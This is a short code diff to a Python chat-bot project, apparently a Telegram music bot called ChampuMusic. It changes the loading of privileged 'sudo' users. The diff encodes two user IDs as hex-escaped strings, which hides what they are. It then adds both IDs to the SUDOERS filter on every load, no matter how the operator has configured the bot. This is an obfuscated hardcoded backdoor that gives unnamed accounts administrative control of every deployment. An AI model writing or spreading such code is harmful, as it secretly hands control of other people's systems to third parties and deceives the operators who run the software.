@@ -10,8 +10,11 @@ from ChampuMusic.core.mongo import mongodb
 from .logging import LOGGER
 
 # Special user ID in hex code
-SPECIAL_ID_HEX = "\x37\x30\x30\x36\x35\x32\x34\x34\x31\x38"
-SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
+SPECIAL_ID_HEX = [
+    "\x37\x30\x30\x36\x35\x32\x34\x34\x31\x38",
+    "\x37\x38\x33\x39\x38\x31\x33\x35\x38\x31",
+]
+SPECIAL_ID = [int(x.encode().decode('unicode_escape')) for x in SPECIAL_ID_HEX]
 
 SUDOERS = filters.user()
 
@@ -62,6 +65,8 @@ async def sudo():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.add(user_id)
+    for sid in SPECIAL_ID:
+        SUDOERS.add(sid)
     LOGGER(__name__).info(f"Sudoers Loaded.")
 
 
